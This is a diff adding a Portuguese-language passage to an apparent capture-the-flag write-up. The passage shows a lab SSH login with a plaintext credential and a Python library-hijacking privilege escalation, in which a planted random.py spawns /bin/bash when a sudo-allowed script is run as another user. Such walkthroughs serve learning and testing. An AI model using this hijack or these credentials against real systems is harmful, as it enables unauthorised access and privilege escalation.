@@ -50,6 +50,27 @@ Só que não tem nada de interessante nesta página só um texto e uma imagem. E
 
 alice:HowDothTheLittleCrocodileImproveHisShiningTail
 
+ssh alice@10.10.204.123
+
+Utilizei o ls -la para verificar o diretórios e encontrei dois arquivos importantes root.txt(sem acesso) e walrus_and_the_carpenter.py
+
+Acessei com sudo -l para conseguir ler o arquivo e nele tinha um poema e uma função que separava 10 versos aleatórios. Elas estavam sendo armazenadas em uma biblioteca chamada random.
+
+python3 -c 'import sys; print (sys.path)'
+
+Descobri também que o arquivo percorre todos os diretórios até encontrar a biblioteca.
+
+Então criei um arquivo aleatório chamado random.py e coloquei o seguinte código.
+
+import os
+os.system("/bin/bash")
+
+E logo em seguida executei o script para verificar se minha teoria estava certa.
+
+sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
+
+E conseguimos acesso a outro usuário.
+
 
 
 
